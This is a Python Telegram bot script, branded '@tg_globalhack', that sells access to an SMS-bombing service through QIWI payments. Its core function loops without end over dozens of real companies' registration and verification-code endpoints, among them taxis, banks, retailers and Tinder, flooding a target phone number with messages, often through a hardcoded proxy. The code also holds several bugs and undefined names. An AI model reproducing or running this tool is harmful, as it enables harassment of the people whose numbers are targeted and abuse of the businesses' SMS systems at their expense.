# -*- coding: utf-8 -*-
import requests
import threading
from threading import Timer
from datetime import datetime, timedelta
from telebot import TeleBot
from threading import Thread
import telebot
import random, datetime, time
from telebot import types
from time import time
from fake_useragent import UserAgent
import re
import os
ua = UserAgent()

banner = """
@tg_globalhack
"""

################################################
qiwi_token = 'токен от киви'
qiwi_phone = 'номер киви ваш'
price = сумма товара
###############Настройка оплаты qiwi############

def donat():
	wallet = qiwi_phone
	token = qiwi_token
	URL = "https://edge.qiwi.com/payment-history/v2/persons/" + wallet + "/payments"
	PARAMS = {'rows': 1, 'operation': 'IN'}
	HEADERS = {'Accept': 'application/json', 'Authorization': 'Bearer ' + token}
	r = requests.get(url=URL, params=PARAMS, headers=HEADERS)
	response = r.json()
	class payment:
		account = 0,
		amount = 0,
		comment = ''
		date=''
	payment.account = response['data'][0]['account']
	payment.amount = response['data'][0]['sum']['amount']
	payment.comment = response['data'][0]['comment']
	payment.date = response['data'][0]['date']
	accoun={}
	amout={}
	mess={}
	date={}

	phone="+"+str(accoun)
	if (str(phone).strip()==str(payment.account).strip() and str(mess).strip()==str(payment.comment).strip() and str(amout).strip()==str(payment.amount).strip() and str(date).strip()==str(payment.date).strip()):
		pass
	else:
		if payment.amount == price or payment.amount > price:
			if str(payment.comment) in open('vip_id.txt', mode='r', encoding = 'utf-8').read():
				pass
			else:
				us = open('vip_id.txt', mode = 'a', encoding = 'utf-8')
				us.write(str(payment.comment) + '\n')
				bot.send_message(payment.comment, "Спасибо за покупку, напишите /start\n\n<b>Удачно пользования, и не шалите!</b>", parse_mode='HTML')
		else:
			pass

	t=Timer(15, donat)
	t.start()
t=Timer(1, donat)
t.start()


TOKEN = 'токен от бота'

THREADS_LIMIT = 100000

wl_file = 'numWL.txt'

chat_ids_file = 'vip_id.txt'

vip_id_file = 'vip_id.txt'

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

def addwl(message):
    try:
        if str(message.text) in open('numWL.txt').read():
            bot.send_message(message.chat.id, f"Номер {message.text} - уже есть в белом листе")
        else:
            f = open('numWL.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"Номер {message.text} - успешно добавлен в белый лист")
    except:
        bot.send_message(message.chat.id, "Ошибка! Вы ввели не номер!")

def delllwl(message):
	with open("numWL.txt", "r") as f:
		lines = f.readlines()
	with open("numWL.txt", "w") as f:
		for line in lines:
			if line.strip("\n") != message.text:
				f.write(line)
	bot.send_message(message.chat.id, f"Пользователь {message.text} - успешно удален из базы")

def send(url,data,headers):
    try:
        print(requests.post(url,data=data,headers=headers))
    except:
        print("<Request Error>")

def user(id):
    f = open(vip_id_file,'r')
    if str(id) in f.read():
        return "1"
    else:
        pass

def delluser(message):
    with open("vip_id.txt", "r") as f:
        lines = f.readlines()
    with open("vip_id.txt", "w") as f:
        for line in lines:
            if line.strip("\n") != message.text:
                f.write(line)
    bot.send_message(message.chat.id, f"Пользователь {message.text} - успешно удален из базы")
    bot.send_message(message.text, f"Доступ к боту вам запрещён.")

def adduser(message):
    try:
        if str(message.text) in open('vip_id.txt').read():
            bot.send_message(message.chat.id, f"Пользователь {message.text} - уже есть в базе")

        else:
            f = open('vip_id.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"Пользователь {message.text} - успешно добавлен в базу")
            bot.send_message(message.text, f'Спасибо за покупку - напишите /start\n\nУдачного пользования, и не шалите!')
    except:
        bot.send_message(message.chat.id, "Ошибка! Вы ввели не айди юзера")

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return

def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(vip_id_file, "r") as vip_file:
        vip_list = [line.split('\n')[0] for line in vip_file]

    [send_message(chat_id) for chat_id in vip_list]

@bot.message_handler(commands=["start"])
def start(m):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="💣Выполнить флуд", callback_data="button1")
    button3 = types.InlineKeyboardButton(text="⚙️Настройки бота", callback_data="button2")
    adminka = types.InlineKeyboardButton(text="Админка", callback_data="adminka1")

    if str(m.chat.id) in open('adm.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        keyboard.add(adminka)
        bot.send_message(m.chat.id, f'@tg_globalhack', reply_markup = keyboard, parse_mode='HTML')
    
    elif str(m.chat.id) in open('vip_id.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        bot.send_message(m.chat.id, f'@tg_globalhack', reply_markup = keyboard, parse_mode='HTML')
    else:
        keyboard = types.InlineKeyboardMarkup()
        button5 = types.InlineKeyboardButton(text="Получить доступ", callback_data="button5")
        keyboard.add(button5)
        bot.send_message(m.chat.id, '@tg_globalhack',  reply_markup=keyboard, parse_mode='HTML')

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="Остановить спам", callback_data="button3")
    keyboard.add(button1)
    if "1" == user(chat_id):
        msg = f'Спам запущен на неограниченое время для номера +{phone_number}!'
        bot.send_message(chat_id, msg, reply_markup=keyboard)
        while chat_id in running_spams_per_chat_id:
            send_for_number(phone_number)

        THREADS_AMOUNT[0] -= 1
        try:
            running_spams_per_chat_id.remove(chat_id)
        except Exception:
            pass
        
    else:
        msg = f'<b>Спам запущен на неограниченое время для номера +{phone_number}!</b>'

        bot.send_message(chat_id, msg, reply_markup=keyboard, parse_mode='HTML')
        end = datetime.now() + timedelta(minutes = 1)

        while datetime.now() < end and chat_id in running_spams_per_chat_id:
            send_for_number(phone_number)    
        try:
            running_spams_per_chat_id.remove(chat_id)
        except Exception:
            pass

def send_for_number(_phone, message):
    if _phone[0] == '+':
        _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone
    
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    iteration = 0
    sms_amount = 0
    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    request_timeout = 0.00001
    while True:
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://api-prime.anytime.global/api/v2/auth/sendVerificationCode', data={'phone': _phone})
            print('[+] Prime отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[+] Yandex.Chef')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')
            
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _name})
            print('[+] EasyPAY отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://www.yaposhka.kh.ua/customer/account/createpost/', data={"success_url": "","error_url": "","is_subscribed": "0","firstname":name,"lastname": name,"email": email,"password":name,"password_confirmation": name,"telephone": _phone})
            print('[+] Yaposhka отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[+] finam отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://www.uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone})
            print('[+] Uklon отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Uklon не отправлено!')

        try:
            requests.post('https://www.uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": _phone})
            print('[+] Uklon отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Uklon не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={"phone": "+" + _phone})
            print('[+] FindClone отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1
            
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print('[+] Fix-Price отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requets.post('https://guru.taxi/api/v1/driver/session/verify', json={"phone": {"code": 1, "number": _phone}})
            print('[+] GURU отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": _phone})
            print('[+] SportMaster!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": name,"application": "lkp","login": "+" +_phone})
            print('[+] Invitro отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1
            
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[+] Iqos отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={"phone": _phone})
            print('[+] Karusel отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={"phone": "+" + _phone})
            print('[+] Lenta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://www.menu.ua/kiev/delivery/profile/show-verify.html', data={"phone": _phone, "do": "phone"})
            print('[+] Menu отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html', data={"user_info[fullname]": name,"user_info[phone]": _phone,"user_info[email]": email,"user_info[password]": name,"user_info[conf_password]": name,})
            print('[+] Menu2 отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://mobileplanet.ua/register', data={"klient_name": name,"klient_phone": "+" + _phone,"klient_email": email})
            print('[+] mobileplanet отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": name,"phone": _phone,"email": email})
            print('[+] MOYO отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1
           
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data={"st.r.phone": "+" +_phone})
            print('[+] OK отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://www.ollis.ru/gql', json={"query": 'mutation { phone(number:"%s", locale:ru) { token error { code message } } }'% _phone})
            print('[+] Oliis отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[+] Online.ua отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requets.post('https://plink.tech/resend_activation_token/?via=call', json={"phone": _phone})
            print('[+] Plink отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://app.redmondeda.ru/api/v1/app/sendverificationcode', headers={"token": "."}, data={"phone": _phone})
            print('[+] REDmondeta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://pay.visa.ru/api/Auth/code/request', json={"phoneNumber": "+" +_phone})
            print('[+] Visa отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://api.iconjob.co/api/auth/verification_code', json={"phone":_phone})
            print('[+] iconjob отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
           print('[-] error in sent!')
           sms_amount -= 1

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[+] RuTaxi sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
            print('[+] BelkaCar sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://mamamia.ua/api/auth/login', data={"phone": _phone})
            print('[+] MamaMia отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://sushiwok.ua/user/phone/validate', data={"phone": "+" +_phone ,"captchaRegisterAnswer":false,"repeatCaptcha":false}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Sushiwok отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Tinder sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Karusel sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Tinkoff отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Dostavista отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] SportMaster отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Alfalife отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] KoronaPay отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://silpo.ua/graphql', data={"validateLoginInput":{"flowId":99322,"currentPlace":"_phone","nextStep":"auth-otp","__typename":"FlowResponse"}}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Silpo отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,}, proxies={"http":"104.20.7.231:8080"})
            print('[+] BTfair отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",}, proxies={"http":"104.20.7.231:8080"})
            print('[+] GGbet отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-]  не отправлено!')

        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",}, proxies={"http":"104.20.7.231:8080"})
            print('[+] ETM отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,}, proxies={"http":"104.20.7.231:8080"})
            print('[+] TheLive отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={}, proxies={"http":"104.20.7.231:8080"})
            print('[+] MTS sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] error in sent!')
            sms_amount -= 1

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] MyGames sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[+] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] MyGames sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[+] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] MyGames sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[+] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] MyGames sent!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[+] error in sent!')

        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Zoloto585 отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Kasta Не отправлено!')

        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Taxi-Ritm отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Mail.ru отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Creditter отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Ingos отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Admiralxxx отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Av отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] MTS отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] City24 отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] SushiMaster отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] 3040 отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",}, proxies={"http":"104.20.7.231:8080"})
            print('[+] Niyama отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] Niyama не отправлено!')

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone}, proxies={"http":"104.20.7.231:8080"})
            print('[+] VSK отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password}, proxies={"http":"104.20.7.231:8080"})
            print('[+] EasyPay отправлено!')
            time.sleep(0.1)
            sms_amount += 1
        except:
            print('[-] не отправлено!')

        bot.send_message(message.chat.id, f'<b>⚠️Уже отправлено на номер {sms_amount}.\nВозможно, количество отправленных СМС не соответсвует полученным.</b>', parse_mode='HTML')

def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите "Остановить спам" и поробуйте снова!')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        if phone not in open(wl_file).read():
            x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
            threads.append(x)
            THREADS_AMOUNT[0] += 1
            x.start()
        else:
            bot.send_message(chat_id, "Данный номер телефона находится в Белом листе. Вы не сможете отправить на него спам. Попробуйте другой номер.\n\nУбрать номер со списка, возможно - через @pentestxr")
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут!')
        print('Максимальное количество тредов исполняется. Действие отменено!')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):

#############################################################################################
    chat_id = int(message.chat.id)
    text = message.text
    if 'РАЗОСЛАТЬ: ' in text and str(chat_id) in open('adm.txt').read():
        msg = text.replace("РАЗОСЛАТЬ: ","")
        send_message_users(msg)

    elif len(text) == 11 and str(chat_id) in open('vip_id.txt').read():
        phone = text
        spam_handler(phone, chat_id, force=False)
    elif len(text) == 12 and str(chat_id) in open('vip_id.txt').read():
        phone = text
        spam_handler(phone, chat_id, force=False)
    else:
        bot.send_message(chat_id, 'Номер введен неправильно.')

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    message = call.message

    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="💣Выполнить флуд", callback_data="button1")
    button3 = types.InlineKeyboardButton(text="⚙️Настройки бота", callback_data="button2")
